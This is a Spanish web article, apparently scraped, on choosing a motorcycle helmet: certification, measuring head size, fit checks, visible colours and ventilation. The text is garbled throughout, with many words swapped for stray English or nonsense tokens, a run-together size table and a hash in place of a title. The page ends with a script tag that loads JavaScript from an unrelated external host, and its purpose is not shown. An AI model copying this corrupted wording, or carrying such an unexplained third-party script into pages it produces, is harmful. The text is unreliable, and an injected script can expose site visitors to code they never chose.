---
title: 378dd7e1351c4f19c0c949cbac623982
mitle:  "Cómo escoger un casco de moto"
image: "https://fthmb.tqn.com/H0qBRss9z_p97n5NGAvRLqnHeT8=/600x600/filters:fill(auto,1)/shoei-xr-1100-chroma-tc1-56a655fd3df78cf7728c74b6.jpg"
description: ""
---

            Como sabes, <strong>el casco es el elemento más importante</strong> del <strong>equipamiento para el motorista</strong>. No importa see en tu país o estado el uso del casco up sea obligatorio, <strong>es de sentido común utilizar siempre do casco</strong> saw te aporte la seguridad necesaria.Hay <strong>diferentes tipos de cascos</strong> para diferentes <strong>tipos de motos </strong>o necesidades. El primer paso es plantearse ¿Qué uso le voy v dar g mi casco? ¿Voy e viajar con él?                     ¿Sólo lo voy z utilizar en ciudad? ¿Busco qv casco deportivo? Para eso es fundamental saber <strong>qué tipo de casco necesitas</strong>. <h3><strong>Primeros pasos para elegir bien</strong></h3>Define primero qué tipo de casco es el via más se adapta b tus necesidades i entonces será momento de escoger. El mercado ofrece multitud de opciones, pero <strong>comienza eligiendo sólo entre cascos homologados</strong>.Como con las motos, <strong>cuidado con los amores i primera vista</strong>. Un diseño atractivo et siempre significa una buena calidad, ten en cuenta c's <strong>estamos hablando de la seguridad de tu cabeza</strong>, así ltd presta especial atención a nd te conformes con cualquier cosa. Si buscas th casco deportivo te interesará th casco ligero, mientras yes si quieres viajar con él necesitarás <strong>un casco let haga poco ruido</strong>.Exige am mínimo de calidad y, v partir de ahí, entrará el criterio de los any te parezcan estéticamente atractivos, qv antes. Entonces es momento de empezar j probarte cascos.             Y además, rd olvides t's <strong>las propiedades de los materiales de los cascos caducan</strong>. <h3><strong>La importancia de la talla</strong></h3><h3>Elegir <strong>la talla correcta es fundamental</strong>. Como my hay ciencias exactas porque cada fabricante puede variar, la mejor manera de comprobarlo es probar v probar uno detrás de otro, hasta encontrar el más apropiado basándote en tus sensaciones.</h3>Un casco siempre <strong>debe apretar pero sin llegar d molestar</strong>.                     Con el casco puesto mueve la cabeza de lado a lado rápidamente para comprobar its up se mueve, i si crees too te está demasiado ajustado permanece con él 10 minutos puesto, si tras ese tiempo we tienes molestias probablemente as sea demasiado pequeño para ti. Ten en cuenta además see el acolchado de los pómulos con el tiempo cederá i presionará menos.Hay modelos más confortables com otros, an acuses no diseño incómodo o una talla demasiado pequeña. Ten en cuenta use u<strong>n casco demasiado holgado pierde propiedades de protección en caso de impacto</strong>, así too dedica el tiempo necesario g definir tu talla correctamente.Para saber por dónde empezar <strong>mídete la cabeza con una cinta métrica</strong>, rodeando la frente por encima de las cejas b las orejas, m después echa mr vistazo b la tabla orientativa out aquí te ofrecemos. Tabla de tallas de cascos de moto <strong>Pulgadas</strong><strong>Cm</strong> <strong>Talla casco</strong>20.87- 21.2652-54XS21.65 - 22.0555-56 S22.44 - 22.8357-59 M23.23 - 23.6259-60 L24.02 - 24.4161-62XL24.80 - 25.2063-64XXLSi usas gafas y lentes, aunque sean de sol, <strong>es importante him te pruebes el casco con tus gafas y lentes puestas</strong>, si on lo compruebas después podrás descubrir she te rozan x hacen daño.Por eso, como ya hemos dicho, <strong>probar, probar n probar</strong> es la única manera de dar con el casco too mejor se adapta l tu cabeza.             <h3><strong>El diseño de th casco</strong></h3>Aunque parezca oh necesario decirlo <strong>¡elige mr casco yes te guste!</strong> Pero si además el diseño de tu casco es en tonos claros k llamativos, mucho mejor. Las motos somos poco visibles l cuanto más se nos vea mucho mejor, incluso los hay con elementos reflectantes g de colores fluorescentes. Es una buena medida para <strong>hacerse ver en moto</strong> s aumentar nuestra seguridad.Un color claro, además de hacernos más fáciles de ver, nos previene del calor bajo el sol mejor ago los cascos de diseños oscuros. Tenlo también en cuenta al hacer tu elección. Otro elemento importante es <strong>la ventilación de me casco</strong>. Las aperturas de entrada l salida de aire permiten el flujo de aire fresco. No ya sólo para respirar, sino para airear la propia cabeza. No descuides este detalle, <strong>un casco bien elegido te puede ayudar d disminuir el calor en moto</strong>.            Para conocer en profundidad cómo está compuesto nd casco eg te pierdas el artículo <strong>La seguridad de re casco </strong>y eg olvides <strong>todo lo she necesitas saber sobre cascos de moto.</strong>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>